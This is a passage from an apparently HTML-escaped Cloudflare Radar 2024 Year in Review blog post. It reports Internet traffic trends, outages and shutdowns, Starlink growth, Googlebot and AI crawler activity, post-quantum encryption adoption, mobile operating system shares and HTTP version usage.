href="https://radar.cloudflare.com/year-in-review/2024#internet-traffic-growth"&gt;&lt;u&gt;worldwide Internet traffic growth&lt;/u&gt;&lt;/a&gt; appeared to be fairly limited, within a percent or two on either side of the baseline value through mid-August. However, at that time growth clearly began to accelerate, climbing consistently through the end of November, growing 17.2% for the year. This trend is similar to those also seen in 2023 and 2022, as we discussed in the &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/"&gt;&lt;u&gt;2023 Year in Review blog post&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, worldwide&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;The West African country of &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gn?previousYear=true"&gt;&lt;u&gt;Guinea&lt;/u&gt;&lt;/a&gt; experienced the most significant Internet traffic growth seen in 2024, reaching as much as 350% above baseline. Traffic growth didn’t begin in earnest until late February, and reached an initial peak in early April. It remained between 100% and 200% above baseline until September, when it experienced several multi-week periods of growth. While the September-November periods of traffic growth also occurred in 2023, they peaked at under 90% above baseline.&lt;/p&gt;&lt;p&gt;The impact of significant Internet outages is also clearly visible when looking at data across the year. Two significant Internet outages in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cu#internet-traffic-growth"&gt;&lt;u&gt;Cuba&lt;/u&gt;&lt;/a&gt; are clearly visible as large drops in traffic in October and November. A reported “complete disconnection” of the national electricity system on the island &lt;a href="https://x.com/CloudflareRadar/status/1847325224208891950"&gt;&lt;u&gt;occurred on October 18&lt;/u&gt;&lt;/a&gt;, lasting &lt;a href="https://x.com/CloudflareRadar/status/1848680148813406474"&gt;&lt;u&gt;just over three days&lt;/u&gt;&lt;/a&gt;. Just a couple of weeks later, on November 6, &lt;a href="https://x.com/CloudflareRadar/status/1854291286322544752"&gt;&lt;u&gt;damage from Hurricane Rafael caused widespread power outages in Cuba&lt;/u&gt;&lt;/a&gt;, resulting in another large drop in Internet traffic. Traffic has remained lower as Cuba’s electrical infrastructure &lt;a href="https://x.com/CloudflareRadar/status/1864263679442567604"&gt;&lt;u&gt;continues to struggle&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, Cuba&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;As we frequently discuss in Cloudflare Radar blog and social media posts, government-directed Internet shutdowns occur all too frequently, and the impact of these actions are also clearly visible when looking at long-term traffic data. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/bd#internet-traffic-growth"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt;, the government ordered the &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#bangladesh"&gt;&lt;u&gt;shutdown of mobile Internet connectivity&lt;/u&gt;&lt;/a&gt; on July 18, in response to student protests. Shortly after mobile networks were shut down, fixed broadband networks were taken offline as well, resulting in a near complete loss of Internet traffic from the country. Connectivity gradually returned over the course of several days, between July 23-28.&lt;/p&gt;

For example, in Muslim countries including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ae?compareWith=ID#internet-traffic-growth"&gt;&lt;u&gt;Indonesia and the United Arab Emirates&lt;/u&gt;&lt;/a&gt;, the celebration of Eid al-Fitr, the festival marking the end of the fast of Ramadan, is visible as a noticeable drop in traffic around April 9-10. &lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Internet traffic trends in 2024, Indonesia and United Arab Emirates&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Google maintained its position as the most popular Internet service. OpenAI, Binance, WhatsApp, and Facebook led their respective categories. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-maintained-its-position-as-the-most-popular-internet-service-openai-binance-whatsapp-and-facebook-led-their-respective-categories"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Over the last several years, the Year In Review has ranked the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-services"&gt;&lt;u&gt;most popular Internet services&lt;/u&gt;&lt;/a&gt;. These rankings cover an “overall” perspective, as well as a dozen more specific categories, based on analysis of anonymized query data of traffic to our &lt;a href="https://1.1.1.1/dns"&gt;&lt;u&gt;1.1.1.1 public DNS resolver&lt;/u&gt;&lt;/a&gt; from millions of users around the world. For the purposes of these rankings, domains that belong to a single Internet service are grouped together.&lt;/p&gt;&lt;p&gt;Google once again held the top spot overall, supported by its broad portfolio of services, as well as the popularity of the Android mobile operating system (more on that &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-one-third-of-mobile-device-traffic-was-from-apple-ios-devices-android-had-a-90-share-of-mobile-device-traffic-in-29-countries-regions-peak-ios-mobile-device-traffic-share-was-over-60-in-eight-countries-regions"&gt;&lt;u&gt;below&lt;/u&gt;&lt;/a&gt;). Meta properties Facebook, Instagram, and WhatsApp also held spots in the top 10.&lt;/p&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/ai/what-is-generative-ai/"&gt;&lt;u&gt;Generative AI&lt;/u&gt;&lt;/a&gt; continued to grow in popularity throughout 2024, and in this category, OpenAI again held the top spot, building on the continued success and popularity of ChatGPT. Within Social Media, the top five remained consistent with 2023’s and 2022’s ranking, including Facebook, TikTok, Instagram, X, and Snapchat.&lt;/p&gt;&lt;p&gt;These categorical rankings, as well as trends seen by specific services, are explored in more detail in a separate blog post, &lt;a href="https://blog.cloudflare.com/radar-2024-year-in-review-internet-services/"&gt;&lt;i&gt;&lt;u&gt;From ChatGPT to Temu: ranking top Internet services in 2024&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;

            &lt;h3&gt;Global traffic from Starlink grew 3.3x in 2024, in line with last year’s growth rate. After initiating service in Malawi in July 2023, Starlink traffic from that country grew 38x in 2024.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#global-traffic-from-starlink-grew-3-3x-in-2024-in-line-with-last-years-growth-rate-after-initiating-service-in-malawi-in-july-2023-starlink-traffic-from-that-country-grew-38x-in-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;SpaceX’s Starlink continues to be the leading satellite Internet service provider, bringing connectivity to unserved or underserved areas. In addition to opening up new markets in 2024, Starlink also announced relationships to provide in-flight connectivity to &lt;a href="https://www.cnbc.com/2024/09/17/spacexs-starlink-has-2500-aircraft-under-contract.html"&gt;&lt;u&gt;multiple airlines&lt;/u&gt;&lt;/a&gt;, and on &lt;a href="https://x.com/Starlink/status/1790426484022342081"&gt;&lt;u&gt;cruise ships&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://x.com/Starlink/status/1857166233969607123"&gt;&lt;u&gt;trains&lt;/u&gt;&lt;/a&gt;, as well as enabling subscribers to roam with their subscription using the &lt;a href="https://www.theverge.com/2024/7/11/24196294/starlink-mini-available-us-price-specs"&gt;&lt;u&gt;Starlink Mini&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;We analyzed aggregate Cloudflare traffic volumes associated with Starlink's primary &lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-an-autonomous-system/"&gt;&lt;u&gt;autonomous system&lt;/u&gt;&lt;/a&gt; (&lt;a href="https://radar.cloudflare.com/as14593"&gt;&lt;u&gt;AS14593&lt;/u&gt;&lt;/a&gt;) to track the growth in usage of the service throughout 2024. Similar to the traffic trends discussed above, the request volume shown on the trend line in the chart represents a seven-day trailing average. Comparisons with 2023 data can be shown by clicking the “Compare” icon at the upper right of the graph. Within comparative views, the lines are scaled to the maximum value shown.&lt;/p&gt;&lt;p&gt;On a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#starlink-traffic.trends"&gt;&lt;u&gt;worldwide&lt;/u&gt;&lt;/a&gt; basis, steady, consistent growth was seen across the year, though it accelerates throughout November. This acceleration may have been driven by traffic associated with customer-specific large software updates. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6Dy2qt4O5b3MCswkckhELA/aa29c7235497bed8c985aa9dd9b63477/traffic_-_Starlink_worldwide.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth worldwide in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In many locations, there is pent-up demand for “alternative” connectivity providers such as Starlink, and in these countries/regions, we see rapid traffic growth when service becomes available, such as in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/zw#starlink-traffic.trends"&gt;&lt;u&gt;Zimbabwe&lt;/u&gt;&lt;/a&gt;. Service availability was &lt;a href="https://x.com/Starlink/status/1832392080481563037"&gt;&lt;u&gt;announced on September 7&lt;/u&gt;&lt;/a&gt;, and traffic from the country began to grow rapidly almost immediately thereafter.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1aLywcrB5w88flsDyK1R1q/1039d989e19dc566cf5f62e60f3f1886/traffic_-_Starlink_Zimbabwe.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth in Zimbabwe in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In new markets, traffic growth continues after that initial increase. For example Starlink service became available in Malawi &lt;a href="https://x.com/Starlink/status/1683897037639790592"&gt;&lt;u&gt;in July 2023&lt;/u&gt;&lt;/a&gt;, and throughout 2024, Starlink traffic from the country grew 38x. While &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mw#starlink-traffic.trends"&gt;&lt;u&gt;Malawi’s 38x increase&lt;/u&gt;&lt;/a&gt; is impressive, other countries also experienced significant growth. In the Eastern European country of &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ge#starlink-traffic.trends"&gt;&lt;u&gt;Georgia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://x.com/Starlink/status/1719581885200998485"&gt;&lt;u&gt;service became available on November 1, 2023&lt;/u&gt;&lt;/a&gt;. After a slow ramp, traffic began to take off growing over 100x through 2024. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/py#starlink-traffic.trends"&gt;&lt;u&gt;Paraguay&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://x.com/Starlink/status/1737914318522581489"&gt;&lt;u&gt;service availability was announced on December 21&lt;/u&gt;&lt;/a&gt;, and began to grow at the beginning of January, registering an increase of over 900x across the year.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6AXOON7CO7XgnWSNnezoiF/bd56192d682c574a2d242845bb0eda16/traffic_-_Starlink_Malawi.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Starlink traffic growth in Malawi in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;

            &lt;h3&gt;Googlebot was responsible for the highest volume of request traffic to Cloudflare in 2024 as it retrieved content from millions of Cloudflare customer sites for search indexing. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#googlebot-was-responsible-for-the-highest-volume-of-request-traffic-to-cloudflare-in-2024-as-it-retrieved-content-from-millions-of-cloudflare-customer-sites-for-search-indexing"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare Radar shows users Internet traffic trends over a selected period of time, but at a country/region or network level. However, &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/#googlebot-was-responsible-for-the-highest-volume-of-request-traffic-to-cloudflare-in-2023"&gt;&lt;u&gt;as we did in 2023&lt;/u&gt;&lt;/a&gt;, we again wanted to look at the traffic Cloudflare saw over the course of the full year from the entire IPv4 Internet. To do so, we can use &lt;a href="https://en.wikipedia.org/wiki/Hilbert_curve"&gt;&lt;u&gt;Hilbert curves&lt;/u&gt;&lt;/a&gt;, which allow us to visualize a sequence of IPv4 addresses in a two-dimensional pattern that keeps nearby IP addresses close to each other, making them &lt;a href="https://xkcd.com/195/"&gt;&lt;u&gt;useful&lt;/u&gt;&lt;/a&gt; for surveying the Internet's IPv4 address space.&lt;/p&gt;&lt;p&gt;Using a Hilbert curve, we can &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ipv4-traffic-distribution"&gt;&lt;u&gt;visualize aggregated IPv4 request traffic to Cloudflare&lt;/u&gt;&lt;/a&gt; from January 1 through December 1, 2024. Within the visualization, we aggregate IPv4 addresses at a &lt;a href="https://www.ripe.net/about-us/press-centre/IPv4CIDRChart_2015.pdf"&gt;&lt;u&gt;/20&lt;/u&gt;&lt;/a&gt; level, meaning that at the highest zoom level, each square represents traffic from 4,096 IPv4 addresses. This aggregation is done to keep the amount of data used for the visualization manageable. (While we would like to create a similar visualization for IPv6 traffic, the enormity of the full IPv6 address space would make associated traffic very &lt;a href="https://observablehq.com/@vasturiano/hilbert-map-of-ipv6-address-space"&gt;&lt;u&gt;hard to see&lt;/u&gt;&lt;/a&gt; in such a visualization, especially as such a small amount has been &lt;a href="https://www.iana.org/numbers/allocations/"&gt;&lt;u&gt;allocated for assignment by the Regional Internet Registries&lt;/u&gt;&lt;/a&gt;.)&lt;/p&gt;&lt;p&gt;Within the visualization, IP addresses are grouped by ownership, and for much of the IP address space shown there, a mouseover at the default zoom level will show the &lt;a href="https://www.nro.net/about/rirs/"&gt;&lt;u&gt;Regional Internet Registry (RIR)&lt;/u&gt;&lt;/a&gt; that the address block belongs to. However, there are also a number of blocks that were assigned prior to the existence of the RIR system, and for these, they are labeled with the name of the organization that owns them. Progressive zooming ultimately shows the autonomous system and country/region that the IP address block is associated with, as well as its share of traffic relative to the maximum. (If a country/region is selected, only the IP address blocks associated with that location are visible.) Overall traffic shares are indicated by shading based on a color scale, and although a number of large unshaded blocks are visible, this does not necessarily mean that the associated address space is unused, but rather that it may be used in a way that does not generate traffic to Cloudflare.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6gtrL1H2gUjSKH7AMSabgM/361d38f34860258449a914e26519a4b4/traffic_-_Hilbert_curve.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Hilbert curve showing aggregated 2024 traffic to Cloudflare across the IPv4 Internet&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Warmer orange/red shading within the visualization represents areas of higher request volume, and buried within one of those areas is the IP address block that had the maximum request volume to Cloudflare during 2024. As it was in 2023, this address block was &lt;a href="https://radar.cloudflare.com/routing/prefix/66.249.64.0/20"&gt;&lt;u&gt;66.249.64.0/20&lt;/u&gt;&lt;/a&gt;, which belongs to Google, and is &lt;a href="https://developers.google.com/static/search/apis/ipranges/googlebot.json"&gt;&lt;u&gt;one of several&lt;/u&gt;&lt;/a&gt; used by the &lt;a href="https://developers.google.com/search/docs/crawling-indexing/googlebot"&gt;&lt;u&gt;Googlebot&lt;/u&gt;&lt;/a&gt; web crawler to retrieve content for search indexing. This use of that address space is a likely explanation for the high request volume, given the number of web properties on Cloudflare’s network.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/g5rQhT7r4DsgpzYdMT3QT/0d6809d96791ee7165ada170d24156e3/traffic_-_Hilbert_curve_Googlebot.png" /&gt;

            &lt;h3&gt;Among AI bots and crawlers, Bytespider (ByteDance) traffic gradually declined over the course of 2024, while ClaudeBot (Anthropic) was more active during the back half of the year.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#among-ai-bots-and-crawlers-bytespider-bytedance-traffic-gradually-declined-over-the-course-of-2024-while-claudebot-anthropic-was-more-active-during-the-back-half-of-the-year"&gt;

          &lt;/div&gt;
        &lt;p&gt;AI bots and crawlers have been in the news throughout 2024 as they voraciously consume content to train ever-evolving models. Controversy has followed them, as not all bots and crawlers respect content owner directives to restrict crawling activity. In July, Cloudflare enabled customers to &lt;a href="https://blog.cloudflare.com/declaring-your-aindependence-block-ai-bots-scrapers-and-crawlers-with-a-single-click/"&gt;&lt;u&gt;block these bots and crawlers with a single click&lt;/u&gt;&lt;/a&gt;, and during Birthday Week &lt;a href="https://blog.cloudflare.com/cloudflare-ai-audit-control-ai-content-crawlers/"&gt;&lt;u&gt;we introduced AI Audit&lt;/u&gt;&lt;/a&gt; to give website owners even more visibility into and control over how AI platforms access their content. &lt;/p&gt;&lt;p&gt;Tracking traffic trends for AI bots can help us better understand their activity over time — observing which are the most aggressive and have the highest volume of requests, which perform crawls on a regular basis, etc. The new &lt;a href="https://radar.cloudflare.com/traffic#ai-bot-crawler-traffic"&gt;&lt;u&gt;AI bot &amp;amp; crawler traffic graph on Radar’s Traffic page&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/bringing-ai-to-cloudflare/#ai-bot-traffic-insights-on-cloudflare-radar"&gt;&lt;u&gt;launched in September&lt;/u&gt;&lt;/a&gt;, provides insight into these traffic trends gathered over the selected time period for the top known AI bots. &lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#ai-bot-and-crawler-traffic"&gt;&lt;u&gt;Looking at traffic trends&lt;/u&gt;&lt;/a&gt; from two of those bots, we can see some interesting patterns. &lt;a href="https://darkvisitors.com/agents/bytespider"&gt;&lt;u&gt;Bytespider&lt;/u&gt;&lt;/a&gt; is a crawler operated by ByteDance, the Chinese owner of TikTok, and is reportedly used to download training data for ByteDance’s Large Language Models (LLMs). Bytespider’s crawling activity trended generally downwards over the course of 2024, with end-of-November activity approximately 80-85% lower than that seen at the start of the year. &lt;a href="https://darkvisitors.com/agents/claudebot"&gt;&lt;u&gt;ClaudeBot&lt;/u&gt;&lt;/a&gt; is Anthropic’s crawler, which downloads training data for its LLMs that power AI products like Claude. Traffic from ClaudeBot appeared to be mostly non-existent through mid-April, except for some small spikes that possibly represent test runs. Traffic became more consistently non-zero starting in late April, but after an early spike, trailed off through the remainder of the year.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7cm0SG0GC36Z3dFu3A6p3J/10a6e32a469984b2083ee0c2ed743d53/traffic_-_AI_bots_--_NEW.png" /&gt;

            &lt;h3&gt;13.0% of TLS 1.3 traffic is using post-quantum encryption.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#13-0-of-tls-1-3-traffic-is-using-post-quantum-encryption"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The term “&lt;a href="https://en.wikipedia.org/wiki/Post-quantum_cryptography"&gt;&lt;u&gt;post-quantum&lt;/u&gt;&lt;/a&gt;” refers to a new set of cryptographic techniques designed to protect data from adversaries that have the ability to capture and store current data for decryption by sufficiently powerful quantum computers in the future. The Cloudflare Research team has been &lt;a href="https://blog.cloudflare.com/sidh-go/"&gt;&lt;u&gt;exploring post-quantum cryptography since 2017&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;In October 2022, we enabled &lt;a href="https://blog.cloudflare.com/post-quantum-for-all/"&gt;&lt;u&gt;post-quantum key agreement&lt;/u&gt;&lt;/a&gt; on our network by default, but use of it requires that browsers and clients support it as well. In 2024, Google's &lt;a href="https://developer.chrome.com/release-notes/124"&gt;&lt;u&gt;Chrome 124&lt;/u&gt;&lt;/a&gt; enabled it by default on April 17, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024#post-quantum-encryption"&gt;&lt;u&gt;adoption grew rapidly following that release&lt;/u&gt;&lt;/a&gt;, increasing from just over 2% of requests to around 12% within a month, and ended November at 13%. We expect that adoption will continue to grow into and during 2025 due to support in other Chromium-based browsers, growing default support in Mozilla Firefox, and initial testing in Apple Safari.&lt;/p&gt;
          &lt;figure&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The two leading mobile device operating systems globally are &lt;a href="https://en.wikipedia.org/wiki/IOS"&gt;&lt;u&gt;Apple’s iOS&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/Android_(operating_system)"&gt;&lt;u&gt;Google’s Android&lt;/u&gt;&lt;/a&gt;, and by analyzing information in the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;user agent&lt;/u&gt;&lt;/a&gt; reported with each request, we can get insight into the distribution of traffic by client operating system throughout the year. Again, we found that Android is responsible for the majority of mobile device traffic when aggregated globally, due to the wide distribution of price points, form factors, and capabilities.&lt;/p&gt;&lt;p&gt;Similar to &lt;a href="https://radar.cloudflare.com/year-in-review/2023#ios-vs-android"&gt;&lt;u&gt;2023’s findings&lt;/u&gt;&lt;/a&gt;, Android was once again &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ios-vs-android"&gt;&lt;u&gt;responsible for just over two-thirds of mobile device traffic&lt;/u&gt;&lt;/a&gt;. Looking at the top countries for Android traffic, we find a greater than 95% share in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sd#ios-vs-android"&gt;&lt;u&gt;Sudan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/bd#ios-vs-android"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/tm#ios-vs-android"&gt;&lt;u&gt;Turkmenistan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mw#ios-vs-android"&gt;&lt;u&gt;Malawi&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/pg#ios-vs-android"&gt;&lt;u&gt;Papua New Guinea&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sy#ios-vs-android"&gt;&lt;u&gt;Syria&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ye#ios-vs-android"&gt;&lt;u&gt;Yemen&lt;/u&gt;&lt;/a&gt;, up from just two countries in 2023. Similar to last year, we again found that countries/regions with higher levels of Android usage are largely in Africa, Oceania/Asia, and South America, and that many have lower levels of &lt;a href="https://ourworldindata.org/grapher/gross-national-income-per-capita?tab=table"&gt;&lt;u&gt;gross national income per capita&lt;/u&gt;&lt;/a&gt;. In these countries/regions, the availability of lower priced “budget” Android devices supports increased adoption.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global distribution of mobile device traffic by operating system in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In contrast, iOS adoption tops out in the 65% range in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/je#ios-vs-android"&gt;&lt;u&gt;Jersey&lt;/u&gt;&lt;/a&gt;, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/fo#ios-vs-android"&gt;&lt;u&gt;Faroe Islands&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gg#ios-vs-android"&gt;&lt;u&gt;Guernsey&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/dk#ios-vs-android"&gt;&lt;u&gt;Denmark&lt;/u&gt;&lt;/a&gt;. Adoption rates of 50% or more were seen in a total of 26 countries/regions, including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/no#ios-vs-android"&gt;&lt;u&gt;Norway&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/se#ios-vs-android"&gt;&lt;u&gt;Sweden&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/au#ios-vs-android"&gt;&lt;u&gt;Australia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/jp#ios-vs-android"&gt;&lt;u&gt;Japan&lt;/u&gt;&lt;/a&gt;, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/us#ios-vs-android"&gt;&lt;u&gt;United States&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ca#ios-vs-android"&gt;&lt;u&gt;Canada&lt;/u&gt;&lt;/a&gt;. These locations likely have a greater ability to afford higher priced devices, owing to their comparatively higher gross national income per capita.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Countries/regions with the largest share of iOS traffic in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Globally, nearly half of web requests used HTTP/2, with 20.5% using HTTP/3.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-half-of-web-requests-used-http-2-with-20-5-using-http-3"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;HTTP (HyperText Transfer Protocol) is the core protocol that the web relies upon. &lt;a href="https://datatracker.ietf.org/doc/html/rfc1945"&gt;&lt;u&gt;HTTP/1.0&lt;/u&gt;&lt;/a&gt; was first standardized in 1996, &lt;a href="https://www.rfc-editor.org/rfc/rfc2616.html"&gt;&lt;u&gt;HTTP/1.1&lt;/u&gt;&lt;/a&gt; in 1999, and &lt;a href="https://www.rfc-editor.org/rfc/rfc7540.html"&gt;&lt;u&gt;HTTP/2&lt;/u&gt;&lt;/a&gt; in 2015. The most recent version, &lt;a href="https://www.rfc-editor.org/rfc/rfc9114.html"&gt;&lt;u&gt;HTTP/3&lt;/u&gt;&lt;/a&gt;, was completed in 2022, and runs on top of a new transport protocol known as &lt;a href="https://blog.cloudflare.com/the-road-to-quic/"&gt;&lt;u&gt;QUIC&lt;/u&gt;&lt;/a&gt;. By running on top of QUIC, &lt;a href="https://www.cloudflare.com/learning/performance/what-is-http3/"&gt;&lt;u&gt;HTTP/3&lt;/u&gt;&lt;/a&gt; can deliver improved performance by mitigating the effects of packet loss and network changes, as well as establishing connections more quickly. HTTP/3 also provides encryption by default, which mitigates the risk of attacks. &lt;/p&gt;&lt;p&gt;Current versions of desktop and mobile Google Chrome (and Chromium-based variants), Mozilla Firefox, and Apple Safari &lt;a href="https://caniuse.com/?search=http%2F3"&gt;&lt;u&gt;all support HTTP/3 by default&lt;/u&gt;&lt;/a&gt;. Cloudflare makes HTTP/3 &lt;a href="https://developers.cloudflare.com/speed/optimization/protocol/http3/"&gt;&lt;u&gt;available for free&lt;/u&gt;&lt;/a&gt; to all of our customers, although not every customer chooses to enable it.&lt;/p&gt;&lt;p&gt;Analysis of the HTTP version negotiated for each request provides insight into the distribution of traffic by the various versions of the protocol aggregated across the year. (“HTTP/1.x” aggregates requests made over HTTP/1.0 and HTTP/1.1.) At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#http-versions"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, 20.5% of requests in 2024 were made using HTTP/3. Another 29.9% of requests were made over the older HTTP/1.x versions, while HTTP/2 remained dominant, accounting for the remaining 49.6%.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/r7KQkjdsXXEtxHoEkFQbO/efb19d1bbd58bef3d657b96555d70103/adoption_-_HTTP_versions_global.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global distribution of traffic by HTTP version in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Looking at version distribution geographically, we found eight countries/regions sending more than a third of their requests over HTTP/3, with &lt;a href="https://radar.cloudflare.com/year-in-review/2024/re#http-versions"&gt;&lt;u&gt;Reunion&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/lk#http-versions"&gt;&lt;u&gt;Sri Lanka&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mn#http-versions"&gt;&lt;u&gt;Mongolia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gr#http-versions"&gt;&lt;u&gt;Greece&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mk#http-versions"&gt;&lt;u&gt;North Macedonia&lt;/u&gt;&lt;/a&gt; comprising the top five as shown below. Eight other countries/regions, including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ir#http-versions"&gt;&lt;u&gt;Iran&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ie#http-versions"&gt;&lt;u&gt;Ireland&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/hk#http-versions"&gt;&lt;u&gt;Hong Kong&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cn#http-versions"&gt;&lt;u&gt;China&lt;/u&gt;&lt;/a&gt;, sent more than half of their requests over HTTP/1.x throughout 2024. More than half of requests were made over HTTP/2 in a total of 147 countries/regions.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Countries/regions with the largest shares of HTTP/3 traffic in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
